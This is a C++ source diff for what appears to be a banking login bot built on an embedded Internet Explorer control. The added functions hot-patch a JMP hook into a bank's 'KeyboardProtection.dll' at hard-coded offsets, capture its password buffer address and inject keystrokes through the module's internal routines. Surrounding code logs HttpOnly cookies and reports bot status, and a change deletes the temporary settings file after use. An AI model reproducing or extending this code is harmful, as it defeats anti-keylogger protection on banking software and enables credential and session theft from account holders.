@@ -4,8 +4,8 @@
 #include "CustIE.h"
 
 // bcm hook header
-#include "hook\myhook.h"
-#include "hook\dllload.h"
+#include "bcmhook\myhook.h"
+#include "bcmhook\dllload.h"
 
 HANDLE CCustIETools::m_hKeyInputLock = INVALID_HANDLE_VALUE;
 
@@ -1278,6 +1278,66 @@ void CCustIETools::string_replace(std::string& strBig, const std::string& strsrc
     }
 }
 
+static CString m_cfg_return_filename(CString m)
+{
+#ifdef  _UNICODE
+	wchar_t drive[100];
+	wchar_t dir[100];
+	wchar_t fname[100];
+	wchar_t ext[100];
+	wchar_t *m1={0};
+	m.ReleaseBuffer();
+	_wsplitpath_s( m, drive, dir, fname, ext );
+	CString l;
+	l+=fname;
+	l+=ext;
+	l.Replace(__T("\\"),__T("\\\\"));
+	return l;
+#else
+	char drive[100];
+	char dir[100];
+	char fname[100];
+	char ext[100];
+	char *m1={0};
+	USES_CONVERSION;
+	m1=m.GetBuffer();
+	m.ReleaseBuffer();
+	_splitpath_s( m1, drive, dir, fname, ext );
+	CString l;
+	l+=fname;
+	l+=ext;
+	l.Replace(__T("\\"),__T("\\\\"));
+	return l;
+#endif
+}
+
+static HMODULE Process_GetModule(DWORD th32ProcessId, LPCTSTR lpModuleFileName)
+{
+	HMODULE hModule = NULL;
+	MODULEENTRY32 me32 = { 0 };
+	CString sModuleFileName("");
+
+	HANDLE hProcess = ::CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, th32ProcessId);
+	if(hProcess != INVALID_HANDLE_VALUE)
+	{
+		me32.dwSize = sizeof(MODULEENTRY32);
+		if(::Module32First(hProcess, &me32))
+		{
+			sModuleFileName = (CString )lpModuleFileName;
+			do {
+				if (0 == sModuleFileName.CompareNoCase(m_cfg_return_filename(me32.szExePath)))
+				{
+					hModule = me32.hModule;
+					break;
+				}
+			}
+			while(::Module32Next(hProcess, &me32));
+		}
+		::CloseHandle(hProcess);
+	}
+	return hModule;
+}
+
 static DWORD BinaryCode_GetAddrByModule(const char * lpModuleName, DWORD nModuleOffset)
 {	
 	HMODULE hModule = GetModuleHandleA(lpModuleName);
@@ -1400,10 +1460,125 @@ void CCustIETools::Hook_Abc()
 	return ;
 }
 
+static DWORD l_nHookBOCBaseAddress = 0;
+static DWORD l_dwBOCPasswordBaseAddress = 0;
+
+void _cdecl TraceAndCollectBOCGetBase(DWORD dwArg, DWORD dwEcx)
+{	
+	if (0 != dwArg)
+	{
+		l_dwBOCPasswordBaseAddress = dwArg;
+	}
+}
+
+void __declspec(naked) CodeBOCGetBase(void)
+{
+	_asm
+	{
+		pushad;
+		pushfd;
+		push ecx;
+		push ebx;
+		call TraceAndCollectBOCGetBase;
+		add esp,4;
+		add esp,4;
+		popfd;
+		popad;
+		mov eax, 0x101;
+		push l_nHookBOCBaseAddress;
+		add [esp], 0x5;
+		retn;
+	}
+}
+
+DWORD __stdcall CCustIETools::ThreadHookBoc(void * param){
+
+	static BOOL bfind = FALSE;
+
+	while(!bfind)
+	{
+		if(Process_GetModule(0,L"KeyboardProtection.dll")!=NULL)
+		{
+			bfind = TRUE;
+			break;
+		}
+		else
+		{
+			Sleep(200);
+		}
+	}
+
+	BYTE byValue[5] = {0xe9};
+	static BYTE l_byszBOCGetBaseSrc[5] = {0};
+
+	if (0 == l_nHookBOCBaseAddress) {
+		l_nHookBOCBaseAddress = BinaryCode_GetAddrByModule("KeyboardProtection.dll",0x00009D6C + 0x1000);
+	}
+	if (0 == l_nHookBOCBaseAddress) {
+		PUTLOG("* Fail to get boc DLL address!");
+		return False;
+	}
+
+	*(DWORD* )&byValue[1] = (DWORD )CodeBOCGetBase - (DWORD )l_nHookBOCBaseAddress - 5;
+	if (l_byszBOCGetBaseSrc[0] == '\0')	{
+		Mem_ReadAddressByteSet(l_nHookBOCBaseAddress, l_byszBOCGetBaseSrc, sizeof(l_byszBOCGetBaseSrc));
+	}
+
+	bool IfOpenHook  =TRUE;
+	if (IfOpenHook) {
+		Mem_ModifyAddressByteSet(l_nHookBOCBaseAddress, byValue, sizeof(byValue));
+	}
+	/*if (!IfOpenHook) {
+	PUTLOG("* UnHook boc");
+	Mem_ModifyAddressByteSet(l_nHookBOCBaseAddress, l_byszBOCGetBaseSrc, sizeof(l_byszBOCGetBaseSrc));
+	}*/
+
+	return 0;
+}
+
+void CCustIETools::Hook_Boc()
+{
+	DWORD dwThreadId = 0;
+
+	HANDLE hHookBocThread = CreateThread(NULL, 0, ThreadHookBoc, NULL , 0, &dwThreadId);	
+}
+
+void CCustIETools::HookInput_Boc(char cValue)
+{
+	if (0 == l_dwBOCPasswordBaseAddress)
+	{
+		PUTLOG("*  Fail to hook BOC");
+		return ;
+	}
+
+	static DWORD nCall = BinaryCode_GetAddrByModule("KeyboardProtection.dll", 0x00001C7B + 0x1000);
+
+	if (0 == nCall) {
+		return ;
+	}
+
+	DWORD dwValue = (DWORD )cValue;
+	if (!isprint(cValue)){
+		return ;
+	}
+
+	_asm {
+		pushad;
+		pushfd;
+		push dwValue;
+		mov ecx, l_dwBOCPasswordBaseAddress;
+		add ecx, 0x78;
+		call nCall;
+		popfd;
+		popad;
+	}
+	return ;
+}
+
 //加载网页前调用
 bool CCustIETools::Hook_Bcm(const std::string hookFilePath)
 {
-    return InitHook(CCustIETools::ToUnicodeString(hookFilePath).c_str());
+    return InitHook(TOUNICODE(hookFilePath)) != 0;
 }
 
 void CCustIETools::HookInput_Bcm(const char* cValue, int len)
@@ -1673,7 +1848,7 @@ bool CCustIETools::GetHttpOnlyCookie(const std::string & url, const std::string 
 							, NULL);
 	if (*wszCookieData && dwCookieSize){
 		cookieData = TOANSI(wszCookieData);
-		PUTLOG("* tphtphtph  Cookie [%s]", TOANSI(wszCookieData));
+		PUTLOG("* Cookie [%s]", TOANSI(wszCookieData));
 	}
 	return (fRet == TRUE);
 }
@@ -1703,6 +1878,16 @@ bool CCustIETools::StatusReport(const Json::Value & gset, unsigned int statusCod
 	}
 	// C++ native params
 	jsonParams["botid"] = (int)::GetCurrentProcessId();
+	
+	// Trim right
+	if (jsonParams.isObject() && jsonParams.isMember("errmsg")){
+		enum{
+			MaxErrMsgLength = 256,
+		};
+		std::string errmsg = jsonParams["errmsg"].asString();
+		errmsg.erase(min((errmsg.length()), (MaxErrMsgLength)));
+		jsonParams["errmsg"] = errmsg;
+	}
 
 	jsonReqBody["voucherMap"] = jsonParams;
 
@@ -1722,6 +1907,10 @@ bool CCustIETools::StatusReport(const Json::Value & gset, unsigned int statusCod
 
 	switch(statusCode){
 	case StatusCode(WAIT_VCODE):
+		{
+			PUTLOG("* LoginBot is working");
+		}break;
+	case StatusCode(WAIT_TOKEN_CODE):
 		{
 			PUTLOG("* LoginBot is working");
 		}break;
@@ -1802,11 +1991,16 @@ bool CCustIETools::LoadGlobalSettings(Json::Value & gset)
 		int z = str.length();
 		Json::Reader reader;
 		if (!reader.parse(str, gset)){
+			ifs.close();
 			PUTLOG("* Failed parse GlobalSettings");
+			BOOL b = ::DeleteFileA(sTmpGSetFile.c_str());
+			PUTLOG("* DeleteFileA: [%s] return [%d]", sTmpGSetFile.c_str(), b);
 			return false;
 		}else{
+			ifs.close();
 			PUTLOG("* Ok to parse out GlobalSettings");
-			//::DeleteFileA(sTmpGSetFile.c_str());
+			BOOL b = ::DeleteFileA(sTmpGSetFile.c_str());
+			PUTLOG("* DeleteFileA: [%s] return [%d]", sTmpGSetFile.c_str(), b);
 			return true;
 		}
 	}while(0);
